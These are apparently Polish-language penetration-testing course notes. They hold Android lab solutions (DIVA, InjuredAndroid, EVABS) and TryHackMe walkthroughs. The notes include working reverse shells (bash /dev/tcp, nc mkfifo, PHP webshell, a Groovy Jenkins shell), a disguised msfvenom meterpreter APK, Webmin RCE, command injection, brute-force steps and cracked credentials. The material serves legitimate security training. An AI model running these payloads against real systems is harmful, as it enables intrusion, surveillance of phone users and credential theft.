+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell ls /data/data/jakhar.aseem.diva/databases/
+
+cd /data/data/jakhar.aseem.diva/databases
+sqlite3 ids2
+.table
+select * from myuser;
+
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb pull /data/data/jakhar.aseem.diva/databases/ids2
+sqlitebrowser
+sqlitebrowser ids2
+
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell ls /data/data/jakhar.aseem.diva/databases/
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell                                                    
+vbox86p:/ # sqlite3 /data/data/jakhar.aseem.diva/databases/ids2
+
+sqlite> select * from myuser;
+
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb pull /data/data/jakhar.aseem.diva/databases/ids2
+
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell cat /data/data/jakhar.aseem.diva/uinfo233309239380838180tmp
+
+Settings -> App&Notifications
+DIca -> Permission
+Storage -> Allow
+
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell cat /sdcard/.uinfo.txt
+
+# Input Validation Issues - Part 1
+
+Payload: ' or 1=1-- -
+
+Kwerenda z kodu źródłowego:
+    SELECT * FROM sqliuser WHERE = '
+
+Całość:
+    SELECT * FROM sqliuser WHERE user ='' or 1=1-- -' ;
+
+
+# Input Validation Issues - Part 2
+
+Wrappery do protokołów:
+
+    file:///
+
+    dict://
+
+    sftp://
+
+    ldap://
+
+    tftp://
+
+    gopher://
+
+    http://
+
+    ftp://
+
+    php://
+
+    zlib://
+
+    data://
+
+    glob://
+
+    phar://
+
+    ssh2://
+
+    rar://
+
+    ogg://
+
+    expect://
+
+
+Payload: file:///etc/hosts
+
+
+# Access Control Issues - Part 1
+
+┌──(kali㉿kali)-[~/mobile_security/apki/mobile-security/apki]
+└─$ sudo apktool d diva-beta.apk -o diva-apktool
+
+┌──(kali㉿kali)-[~/mobile_security/apki/mobile-security/apki]
+└─$ cd diva-apktool
+
+cat AndroidManifest.xml | grep exported
+cat AndroidManifest.xml | grep API
+
+Wyświetlenie exportowanego widoku
+
+adb shell am start -n jakhar.aseem.diva/.APICredsActivity
+
+
+# Access Control Issues - Part 2
+
+┌──(kali㉿kali)-[~/…/apki/mobile-security/apki/diva-apktool]
+└─$ cd res/values
+
+┌──(kali㉿kali)-[~/…/apki/diva-apktool/res/values]
+└─$ cat strings.xml | grep chk_pin
+
+┌──(kali㉿kali)-[~/…/apki/diva-apktool/res/values]
+└─$ adb shell am start -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false
+
+# Access Control Issues - Part 3
+
+adb shell cat /data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml
+
+┌──(kali㉿kali)-[~/…/apki/mobile-security/apki/diva-apktool]
+└─$ cat AndroidManifest.xml | grep true
+
+adb shell content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes/
+
+
+# Hardcoding Issues - Part 2
+
+┌──(kali㉿kali)-[~/…/apki/mobile-security/apki/diva-apktool]
+└─$ adb shell ls /data/data/jakhar.aseem.diva/lib
+
+sudo adb pull /data/data/jakhar.aseem.diva/lib/libdivajni.so
+
+strings libdivajni.so
+
+    olsdfgad;lh
+
+
+
+# Input Validation Issues - Part 3
+
+python3
+print("X" * 1000)
+lub
+print("X" * 3000)
+
+Output skopiować do Pola Enter Launch Code for WOMD & Push the Red Button
+
+***
+
+InjuredAndroid-1.0.10-release.apk
+
+┌──(kali㉿kali)-[~/…/apki/mobile-security/apki/InjuredAndroid]
+└─$ sudo d2j-dex2jar classes.dex -o InjuredAndroid.jar
+
+┌──(kali㉿kali)-[~/…/apki/mobile-security/apki/InjuredAndroid]
+└─$ jd-gui InjuredAndroid.jar
+
+adb shell ls /data/data | grep inj
+adb shell pm list packages | grep inj
+
+# XSSTEXT
+
+<script>alert(1)</script>
+
+# FLAG ONE - LOGIN
+
+FlagOneLoginActivity.class
+
+    F1ag_0n3
+
+
+# FLAG TWO - EXPORTED ACTIVITY
+
+sudo apktool d InjuredAndroid-1.0.10-release.apk -o IA-apktool-czytelny-androidManifest
+cd IA-apktool-czytelny-androidManifest
+
+cat AndroidManifest.xml | grep true
+
+Wyświetlenie wyexportowanych widoków:
+
+1. adb shell am start -n b3nac.injuredandroid/.ExportedProtectedIntent
+2. adb shell am start -n b3nac.injuredandroid/.QXV0aA
+3. adb shell am start -n b3nac.injuredandroid/.b25lActivity
+
+    S3c0nd_F1ag
+
+
+# FLAG THREE - RESOURCES
+
+🔗 --Decompiler - online
+https://www.decompiler.com/
+
+InjuredAndroid-1.0.10-release.apk/sources/b3nac/injuredandroid/R.java
+
+public static final int cmVzb3VyY2VzX3lv = 2131689519;
+
+/InjuredAndroid/res/values/strings.xml
+
+<string name="cmVzb3VyY2VzX3lv">F1ag_thr33</string>
+
+
+# FLAG FOUR - LOGIN 2
+
+b3nac.injuredandroid.FlagFourActivity.class
+
+b3nac.injuredandroid.g.class
+
+private byte[] a = Base64.decode("NF9vdmVyZG9uZV9vbWVsZXRz", 0);
+
+base64: NF9vdmVyZG9uZV9vbWVsZXRz
+
+https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=TkY5dmRtVnlaRzl1WlY5dmJXVnNaWFJ6
+
+4_overdone_omelets
+
+# FLAG FIVE - EXPORTED BROADCAST RECEIVER
+
+b3nac.injuredandroid.FlagFiveReceiver
+
+3x nacisnąć reciever
+
+F1v3!
+
+
+# FLAG SEVEN - SQLITE
+
+I opcja
+
+b3nac.injuredandroid.FlagSevenSqliteActivity.class
+
+((FloatingActionButton)findViewById(2131230901)).setOnClickListener(new a(this));
+    SQLiteDatabase sQLiteDatabase = this.u.getWritableDatabase();
+    ContentValues contentValues = new ContentValues();
+    contentValues.put("title", Base64.decode("VGhlIGZsYWcgaGFzaCE=", 0));
+    contentValues.put("subtitle", Base64.decode("MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=", 0));
+    sQLiteDatabase.insert("Thisisatest", null, contentValues);
+    contentValues.put("title", Base64.decode("VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==", 0));
+    contentValues.put("subtitle", h.c());
+    sQLiteDatabase.insert("Thisisatest", null, contentValues);
+  }
+
+The flag hash!|2ab96390c7dbe3439de74d0c9b0b1767 : hunter2
+
+II opcja
+
+adb pull /data/data/b3nac.injuredandroid/databases/Thisisatest.db
+
+sqlitebrowser Thisisatest.db
+
+1 The flag hash! 2ab96390c7dbe3439de74d0c9b0b17672
+2 The flag is also a password! 9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@>^DB=:E6];D@?
+
+ROT-47
+https://gchq.github.io/CyberChef/#recipe=ROT47(47)&input=OUVFQURpXl46PztGQzY1Mj81Q0A6NV03OkM2MzJENjpAXTRAPl5EQj06RTZdO0RAPw
+
+https://injuredandroid.firebaseio.com/sqlite.json
+
+"S3V3N_11"
+
+S3V3N_11:hunter2
+
+***
+
+Do przygotowania na następne zajęcia 25.02.2023
+
+Instalacja Frida
+
+curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
+sudo python get-pip.py
+sudo apt install python3-pip -y
+
+sudo pip3 install Frida
+sudo python3 get-pip.py 
+sudo pip3 install objection
+sudo pip3 install frida-tools
+
+Instalacja MobSF
+
+cd /opt
+sudo chmod 777 /opt
+git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
+cd Mobile-Security-Framework-MobSF
+sudo apt-get install python3-venv
+sudo ./setup.sh
+
+
+***
+
+# EVABSv4.apk
+
+    Level 1 - Debug Me
+
+
+adb shell pm list packages | grep eva
+adb logcat | grep CTRL
+
+EVABS{logging_info_never_safel}
+
+***
+
+📅 25.02.2023 🕘 [09:00]
+
+Wykładowca: Aleksander Wojdyła
+aleksanderw@hackeru.com
+
+Global Mobile Security
+
+Chapter 3 SSL Pinning & Android Malwares & Run Time Debugging 
+= - = - = - = - = - = - =  - = - = - = - = - = - = - = - = - 
+
+ℹ️ Przerwy: 
+
+10:30-11:00
+13:00-13:45
+15:00-15:30
+
+[SSL Pinning]
+
+🔗 -- Wykorzystanie Frida
+https://github.com/dweinstein/awesome-frida
+
+### 📋 – Lab01 FRIDA
+
+🔗 -- Extra File
+https://beyond.hackampus.com/canvas/general/general-5PpdO-2021.04.14.05.48.24-APK-Learner.rar
+
+# Instalacja certyfikatu Burp
+Burp Suite: Proxy --> Options --> Proxy Listeners --> All Interfaces --> OK
+
+Eksportujemy mycert.cer
+
+Instalacja Frida
+
+curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
+sudo python get-pip.py
+sudo apt install python3-pip -y
+sudo mv /usr/local/bin/pip /usr/local/bin/pip2
+
+Sprawdzenie wersji pip (powinny być równe)
+
+    pip -V
+
+    pip2 -V
+
+    pip3 -V
+
+
+Opcjonalnie w przypadku problemów z wersjami pip:
+
+    pip3 install typing-extensions --upgrade
+
+    /usr/bin/python -m pip install --upgrade pip
+
+
+sudo pip3 install frida
+sudo pip3 install objection
+sudo pip3 install frida-tools
+frida
+
+locate frida
+find / -name frida 2>/dev/null
+#jeśli będą problemy to odinstalować i zainstalować raz jeszcze:
+pip uninstall frida
+
+Instalacja drozer
+
+sudo apt-get install build-essential python3-dev libssl-dev swig
+pip2 install setuptools
+pip2 install Twisted
+
+curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
+sudo python2.7 get-pip.py
+wget https://github.com/mwrlabs/drozer/releases/download/2.4.4/drozer-2.4.4-py2-none-any.whl
+
+sudo pip2 install drozer-2.4.4-py2-none-any.whl
+
+***
+
+Frida
+
+adb connect IP:5555
+adb devices
+
+adb shell getprop ro.product.cpu.abi
+https://github.com/frida/frida/releases/download/16.0.3/frida-server-16.0.3-android-x86.xz
+adb push frida-server-16.0.3-android-x86 /data/local/tmp/Frida-server
+adb shell
+
+    chmod 777 /data/local/tmp/Frida-server
+
+    /data/local/tmp/Frida-server
+
+
+frida-ps -U
+
+git clone https://github.com/httptoolkit/frida-android-unpinning.git
+https://twitter.en.uptodown.com/android
+
+frida-ps -U
+frida-ps -U | grep Twitter
+cd frida-android-unpinning
+frida -U -p 1111 -l frida-script.js
+
+***
+
+### 📋 – Lab03 Objection
+
+sudo pip3 install objection
+
+sudo objection
+sudo objection -g Twitter explore -q
+
+    android sslpinning disable
+
+
+***
+
+[Android Malwares & Run Time Debugging]
+
+🔗 -- Bezpieczeństwo aplikacji webowych
+https://sklep.securitum.pl/ksiazka-bezpieczenstwo-aplikacji-webowych
+
+🔗 -- Logic gate
+https://en.wikipedia.org/wiki/Logic_gate
+
+🔗 -- Podatność Log4Shell
+https://en.wikipedia.org/wiki/Log4Shell
+
+🔗 -- APK Pure
+https://apkpure.com/pl/
+
+***
+
+### 📋 – Lab04 Analysis
+
+🔗 -- jd-gui-1.6.6.jar
+https://ln5.sync.com/dl/46585fe90/wfre6zfg-4g5c95is-rkuyvm58-p4ff6xja
+
+🔗 -- Netflix.apk
+https://ln5.sync.com/dl/46585fe90/wfre6zfg-4g5c95is-rkuyvm58-p4ff6xja/view/default/10454633350007
+
+dex-tools-2.1
+
+    d2j-dex2jar.bat netflix.apk
+
+
+Analiza pliku w JD-GUI
+
+    netflix-dex2jar.jar
+
+
+Sprawdzamy adres IP
+https://whatismyipaddress.com/ip/27.147.162.222
+
+***
+
+### 📋 – Lab05 Malware
+
+sudo python3 -m http.server 8080
+netstat -ano
+ 
+#aby zabić proces zajmujący  port 8080
+kill $(lsof -t -i:8080)
+kill -9 $(lsof -t -i:8080)
+
+#na telefonie
+http://ip_kali:8080
+
+#Tworzymy malware (reverseshell):
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f raw -o FajnyKalkulator.apk
+
+ls | grep FajnyKalkulator.apk
+
+#uruchamiamy metasploita:
+    msfconsole
+    use exploit/multi/handler
+    show options
+    set LHOST=IP_KALI
+    set LPORT=4444
+    show options
+    set payload android/meterpreter/reverse_tcp
+    explot    lub run
+#przerzucamy wygenerowany plik na telefon:
+    http://IP_KALI:8080
+    http://IP_KALI:8080/FajnyKalkulator.apk
+#uruchamiamy i instalujemy pobrany plik na telefonie i czekamy na zwrotne połączenie:
+    adb install FajnyKalkulator.apk
+#możemy zdalnie pracować na tel:
+    help
+    check_root
+    record_mic
+    screenshot
+    hide_app_icon
+    shell
+    whoami
+    exit
+    set_audio_mode
+    app_list
+    app_uninstall com.twitter.android
+  
+#pobranie wersji firefox na telefon:
+    https://www.apkmirror.com/apk/mozilla/firefox/firefox-65-0-release/firefox-browser-fast-private-65-0-3-android-apk-download/
+
+### 📋 – Lab06 MobSF
+
+sudo apt-get install docker docker.io
+docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
+sudo docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
+
+#Jeśli nie działa to:
+    kill -9 $(lsof -t -i:8000)
+
+#uruchomienie konsoli MobSF:
+    http://localhost:8000
+
+#Pobieramy aplikację i wgrywamy na Kali:
+    https://we.tl/t-LG9TOyYhIx
+    https://beyond.hackampus.com/canvas/general/general-jTyoj-2020.09.14.06.38.29-sieve.rar
+    
+### 📋 – Lab07 Drozer
+
+🔗 -- Android penetration tools walkthrough series: Drozer:
+    https://resources.infosecinstitute.com/topic/android-penetration-tools-walkthrough-series-drozer/
+    
+#Instalujemy Drozer agent
+
+https://github.com/m9rco/Genymotion_ARM_Translation/raw/master/package/Genymotion-ARM-Translation_for_9.0.zip
+
+🔗 -- Aplikacja do testów
+https://github.com/abhi-r3v0/EVABS/releases/download/v4/EVABSv4.apk
+
+adb forward tcp:31415 tcp:31415
+drozer console connect
+
+sudo pip install --upgrade setuptools
+sudo pip install twisted
+drozer console connect
+run app.package.list
+
+🔗 -- Jailbreak
+https://www.theiphonewiki.com/wiki/Jailbreak
+https://checkra.in/
+https://theodyssey.dev/
+https://www.appletech752.com/downloads.html
+
+📅 26.02.2023 🕘 [09:00]
+
+***
+
+### 📋 – EVABSv4.apk
+
+https://github.com/abhi-r3v0/EVABS
+
+Level 1: Debug Me
+adb connect IP_tel:5555
+adb shell ps | grep eva
+logcat help
+adb logcat --pid="wartość id"  #numer procesu
+
+Level 2: File Access
+adb shell
+cd sdcard
+ls
+cd /data/data
+adb shell ps | grep eva
+ls -al
+klucz w zasobach 'assets' (secrets.txt)
+
+Level 3: Strings
+EVABSv4\res\values\strings.xml
+
+Level 4: Resource
+grep -r "EVABS{" *
+cat res / raw / link.txt
+
+Level 5: Shares and Preferences
+EVABSv4\res\values\strings.xml
+www.github.com/abhi-r3v0/Adhrit
+cd /data/data/com.revo.evabs/shared_prefs
+cat PREFERENCE.xml
+
+vbox86p:/data/data/com.revo.evabs/shared_prefs # cat DETAILS.xml
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="password">EVABS{shar3d_pr3fs_c0uld_be_c0mpromiz3ds}</string>
+    <string name="username">User</string>
+</map>
+
+flaga: EVABS{shar3d_pr3fs_c0uld_be_c0mpromiz3ds}
+
+Level 6: DB Leak
+cd /data/data/com.revo.evabs/databases
+cat MAINFRAME_ACCESS
+sqlite3 MAINFRAME_ACCESS
+.table
+select * from CREDS;
+
+Level 7: Export
+adb forward tcp:31415 tcp:31415
+#z poziomu Drozera:
+    run app.package.attacksurface com.revo.evabs
+    run app.service.info -a com.revo.evabs
+    run app.activity.info -a com.revo.evabs
+    run app.activity.start --component com.revo.evabs com.revo.evabs.ExportedActivity
+
+Level 8: Decode
+EVABSv4\smali\com\revo\evabs\Decode
+Decode.class
+EVABS{nev3r_st0re_s3ns!tiv3_data_1n_7h3_s0urcec0de}
+https://www.base64decode.org/
+
+Level 9: Smali Injection
+EVABSv4\smali\com\revo\evabs\SmaliInject
+ z  “LAB_OFF” na “LAB_ON” 
+dekompilacja, rebuild i  reinstalacja
+
+🏠 Homework:
+    Level 10: Intercept
+    Level 11: Custom PERM
+    Level 12: Instrument
+
+***
+
+### 📋 – Cywar
+
+https://cywar.hackeru.com/challenges/imperial-memory
+derrekr:r3s3arch3r
+vol.py -f Emperor.vmem imageinfo
+vol.py -f Emperor.vmem --profile=Win10x64_17134 pstree
+vol.py -f Emperor.vmem --profile=Win10x64_17134 cmdline -p 5496
+vol.py -f Emperor.vmem --profile=Win10x64_17134 memdump -p 5496 --dump-dir .
+
+strings 5496.dmp
+strings 5496.dmp |grep pass
+strings 5496.dmp | grep gift
+
+md5sum secrets.txt
+
+
+https://cywar.hackeru.com/challenges/knock-knock
+adam:r3s3arch3r
+server-48
+
+nmap server-48
+ping server-48
+nmap -p- server-48 --min-rate 2500
+
+#Filtr w wireshark
+tcp.port == 22
+#należy wywołać porty:
+🔗 -- Informacje o Port_knocking
+https://en.wikipedia.org/wiki/Port_knocking
+    21310
+    31991
+    13337
+
+telnet server-48 21310
+telnet server-48 31991
+telnet server-48 13337
+
+#otworzył się port 22 (SSH):
+    nmap server-48
+
+#Logujemy sie przez SSH, klucz jest w katalogu Desktop:
+    cd Desktop
+    ssh -i imax0r.key imax0r@server-48
+
+***
+    
+### 📋 – TryHackMe
+
+https://tryhackme.com/dashboard
+https://tryhackme.com/access
+
+***
+
+#Maszyna 1 Ignite
+https://tryhackme.com/room/ignite
+
+
+sudo openvpn THM.ovpn
+
+#Uwaga za IP należy wstawić swój adres IP:
+    nmap IP
+    nmap -p- IP --min-rate 2500
+    nmap -sC -sV --script vuln -p 80 IP
+    http://IP/robots.txt
+    http://IP/fuel
+    admin:admin
+    curl https://gist.githubusercontent.com/kriss-u/8e1b44b1f4e393cf0d8a69117227dbd2/raw/4419f8dc7090a41c7ebc96048daf67c43c1996a3/exploit.py > exploit1.py
+    cat exploit1.py
+    python exploit1.py
+    mousepad exploit1.py
+    url = "http://IP_MASZYNY"
+    whoami && ifconfig
+    
+    
+🔗 -- Reverse Shell Generator
+https://www.revshells.com/
+
+    bash -i >& /dev/tcp/IP/5555 0>&1
+
+    cat /usr/share/webshells/php/php-reverse-shell.php
+
+    cp /usr/share/webshells/php/php-reverse-shell.php .
+
+    mousepad php-reverse-shell.php
+
+    $ip = 'IP';  // CHANGE THIS
+
+    $port = 5555;       // CHANGE THIS
+
+
+#Na kalim uruchamiamy:
+
+    python3 -m http.server 8080
+
+    nc -lvnp 5555
+
+
+#Z poziomu shell-a:
+
+    wget http://IP:8080/php-reverse-shell.php
+
+
+#Z przeglądarki:
+    http://IP/php-reverse-shell.php
+
+#Otrzymujemy reverseshell:
+    cat /home/www-data/flag.txt
+
+#Pobieramy na kali:
+    https://github.com/carlospolop/PEASS-ng/releases/download/20230226/linpeas.sh
+
+#z poziomu reverseshell:
+    cd /tmp
+    wget http://IP:8080/linpeas.sh
+    chmod +x linpeas.sh
+    ./linpeas.sh > peas.txt
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    cd /var/www/html
+    cd /var/www/html/fuel/application/config
+    cat database.php
+    mememe
+
+***
+
+# Maszyna 2 Source (WebMin-1.890)
+https://tryhackme.com/room/source
+
+#Z poziomu kali skanujemy maszynę
+#Uwaga za IP należy wstawić swój adres IP:
+    nmap IP
+    nmap -p- IP --min-rate 2500
+    nmap -sC -sV --script vuln -p 22,10000
+    https://IP:10000
+    
+
+#Sprawdzamy exploity dla WebMin-1.890:
+    https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE
+#Pobieramy kod:
+    git clone https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE.git
+#Wykonujemy pobrany kod (Podmieniamy IP na nasz):
+    python3 webmin-1.890_exploit.py IP 10000 whoami
+
+# Metasploit
+
+msfconsole
+use exploit/linux/http/webmin_backdoor
+
+show options
+set RHOSTS 10.10.68.13 <IP atakowanej maszynki>
+set LHOST tun0
+set SSL true
+exploit
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+#Flagi
+
+root@source:/usr/share/webmin/# cat /home/dark/user.txt
+
+root@source:/usr/share/webmin/# cat /root/root.txt
+
+***
+
+# Maszyna 3 Lazy Admin
+https://tryhackme.com/room/lazyadmin
+
+nmap -p- IP --min-rate 2500
+
+#Enumeracja katalogów na porcie 80
+dirb http://IP
+
+http://IP/content
+
+CMS SweetRice installed
+https://www.exploit-db.com/exploits/40716
+
+searchsploit sweetrice 
+
+SweetRice 1.5.1 - Backup Disclosure | php/webapps/40718.txt
+cat /usr/share/exploitdb/exploits/php/webapps/40718.txt
+
+/content/as/ Panel logowania
+/content/inc/mysql_backup/
+/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
+
+cat mysql_bakup_20191129023059-1.5.1.sql
+
+manager
+42f749ade7f9e195bf475f37a44cafcb:Password123
+https://crackstation.net/
+
+#Logujemy się w panelu
+
+manager:Password123
+
+Current version : 1.5.1
+
+#Data Import
+/content/as/?type=data&mode=db_import
+
+Browse --> Wybieramy plik --> Done
+
+mv php-reverse-shell.php php-reverse-shell.php5
+[!] jeśli ktoś nie ma: /usr/share/webshells/php/php-reverse-shell.php
+
+Odwołujemy się do uploaowanego pliku:
+/content/inc/mysql_backup/php-reverse-shell.php5
+
+nc -lnvp 5555
+
+# Otrzymujemy shell'a
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+#Flaga usera
+cat /home/itguy/user.txt
+
+sudo -l
+
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+
+cat /home/itguy/backup.pl
+
+    #!/usr/bin/perl
+
+
+    system("sh", "/etc/copy.sh");
+
+
+
+cat /etc/copy.sh
+
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+
+ls -al /etc/copy.sh
+
+#Przygotowujemy Reverse Shell
+
+https://www.revshells.com/
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc IP 5554 >/tmp/f" > /etc/copy.sh
+
+nc -lvnp 5554
+
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+#Flaga roota
+cat /root/root.txt
+
+***
+
+UltraTech (medium)
+
+https://tryhackme.com/room/ultratech1
+
+nmap -p- IP --min-rate 2500
+
+UltraTech API v0.1.3
+
+nmap -sC -sV --script vuln -p 21,22,8081,31331 IP
+
+
+dirb http://IP:8081
+
+    /auth > You must specify a login and a password
+
+    /ping
+
+    /ping?ip=localhost
+
+
+http://IP:31331/robots.txt
+
+Panel logowania
+http://IP:31331/partners.html
+
+#Command execution
+/ping?ip=`ls`
+
+    ping: utech.db.sqlite:
+
+
+/ping?ip=`cat utech.db.sqlite`
+
+r00t:f357a0c52799563c7c7b76c1e7543a32 > n100906admin:0d0ea5111e3c1def594c1684e3b9be84 > mrsheafy
+
+#Logowanie ssh
+ssh r00t@IP
+
+id
+uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+
+docker images
+
+🔗 -- Docker 
+https://pl.wikipedia.org/wiki/Docker_(oprogramowanie)
+
+🔗 -- gtfobins docker
+https://gtfobins.github.io/gtfobins/docker/
+
+docker run -v /:/mnt --rm -it bash chroot /mnt bash
+
+root@2b9b3b8ba55b:/# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+
+cat /root/.ssh/id_rsa
+
+    -----BEGIN RSA PRIVATE KEY-----
+
+    MIIEogIBA
+
+
+***
+
+Internal (hard)
+https://tryhackme.com/room/internal
+
+nmap -p- IP --min-rate 2500
+
+dirb http://IP
+
+/blog/
+/phpmyadmin/
+/wordpress/
+
+wpscan --url http://IP/blog
+
+Wordpress 5.4.2
+
+#Dodajemy IP z maszynki THM do pliku /etc/hosts
+
+sudo mousepad /etc/hosts
+
+    <IP maszynki THM> internal.thm
+
+
+
+dirb http://internal.thm
+
+#Panel logowania
+http://internal.thm/blog/wp-login.php
+
+#Brute-force panelu logowania
+
+ls -al /usr/share/wordlists/rockyou.txt
+
+#Jeżeli pliku nie ma należy go rozpakować
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+
+wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt
+
+    [+] Performing password attack on Xmlrpc against 1 user/s
+
+
+admin:my2boys
+
+
+Posts
+Don't forget to reset Will's credentials. william:arnold147
+
+Theme Editor:
+    
+Edytujemy plik 404.php
+http://internal.thm/blog/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen
+
+cat php-reverse-shell.php5
+Kopiujemy zawartośc pliku do frameworku.
+
+Odwołujemy się do zaktualizowanego pliku
+http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+
+nc -lnvp 5555
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+cat /var/www/html/wordpress/wp-config.php
+
+#Upload Linpeas
+https://github.com/carlospolop/PEASS-ng/releases/download/20230205/linpeas.sh
+
+python3 -m http.server 8080
+
+wget http://IP:8080/linpeas.sh
+cd /tmp
+chmod +x linpeas.sh
+./linpeas.sh
+
+cd /opt
+cat wp-save.txt
+
+aubreanna:bubb13guM!@#123
+
+#Połączenie SSH
+ssh aubreanna@internal.thm
+
+#Flaga usera
+cat /home/aubreanna/user.txt
+
+cat /home/aubreanna/jenkins.txt 
+Internal Jenkins service is running on 172.17.0.2:8080
+
+#Przekierowanie portów
+https://github.com/jpillora/chisel
+
+ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
+
+bubb13guM!@#123
+127.0.0.1:8080 > Welcome to Jenkins!
+
+Burp Suite
+
+Ustawiamy proxy na 8081 (ponieważ na 8080 działa Jenkins)
+
+Intruder
+POST /j_acegi_security_check HTTP/1.1
+j_username=admin&j_password=§admin§&from=%2F&Submit=Sign+in
+
+cały POST: https://pastebin.com/0zSnNZi7
+
+Atak typu Sniper
+
+Wybieramy pierwsze 100 haseł z rockyou.txt
+head -n 100 /usr/share/wordlists/rockyou.txt
+
+i wklejamy do payloadu
+
+admin:spongebob
+
+http://127.0.0.1:8080/script
+
+Reverse shell do Jenkins
+
+String host="IP";
+int port=3333;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+nc -lvnp 3333
+
+cat /opt/note.txt
+root:tr0ub13guM!@#123
+
+ssh root@internal.thm
+
+#Flaga roota
+
+cat /root/root.txt
+
+***
+
